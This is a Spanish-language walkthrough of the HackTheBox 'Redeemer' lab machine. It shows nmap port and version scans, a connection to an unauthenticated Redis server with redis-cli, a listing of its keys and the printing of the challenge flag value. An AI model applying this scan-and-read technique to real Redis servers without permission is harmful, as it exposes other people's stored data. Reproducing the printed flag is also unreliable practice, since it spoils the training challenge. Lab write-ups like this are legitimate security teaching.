---
title: Redeemer HTB Walkthrough
published: true
---

# Redeemer HTB

En este artículo trataré la resolución de una de las máquinas del Tier 0 del starting point de HackTheBox.

## Fase de reconocimiento

Una vez comprobado que la maquina está activa (`ping -c 1 <ip>`), lanzamos nmap para buscar los puertos abiertos:

```
$nmap --open -p- <ip>

Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-26 14:17 CET
Nmap scan report for <ip>
Host is up (0.064s latency).
Not shown: 65529 closed ports, 5 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
6379/tcp open  redis
```

Podemos ver que se encuentra abierto el puerto 6379, sobre el que corre el servicio redis. Volvemos a ejecutar nmap para tratar de determinar la versión del servicio:

```
$nmap -p6379 -sV <ip>

Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-26 14:20 CET
Nmap scan report for <ip>
Host is up (0.069s latency).

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.82 seconds
```

Ahora que tenemos el servicio y versión realizamos una busqueda.

### Qué es redis?

*REmote DIctionary Server* es un sistema de almacenamiento clave-valor open-source NO-SQL. Almacena datos como parejas clave-valor, suele utilizarse como almacenamiento a corto plazo de datos que necesitan ser recuperados rapidamente.

Este servicio corre del lado del servidor que escucha las conexiones de los clientes. Necesitaremos por tanto el cliente de redis.

### Instalación del cliente

Aunque podemos utilizar netcat, utilizaremos redis-cli:

```
$sudo apt install redis-tools
```

### Conexión con el servidor redis

Para conectarnos con el servidor a través de redis utilizamos el siguiente comando:

```
$redis-cli -h <ip>
<ip>>
```

## Consiguiendo la data del servidor

Si tiene éxito conseguiremos un intérprete de comandos de redis. Una vez hayamos accedido, podremos ver información del servicio con el comando `info`, seleccionaremos el apartado `server` y `keyspace`:

```
$>info server
```

Y dará una salida como:

```
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:757
run_id:4e8a9f52e7ed532ffce3c4793818b948c79fcde2
tcp_port:6379
uptime_in_seconds:287
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:13818212
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
```

```
$>info server
```

Que nos da:

```
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

Donde vemos que existe sólo un diccionario con indice 0:

```
$> select 0
OK
```

Podemos también listar las claves:

```
$> keys *
1) "temp"
2) "numb"
3) "flag"
4) "stor"
```

Solo queda conseguir el valor de la clave *"flag"*:

```
$> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

Enhorabuena! Has conseguido la flag!
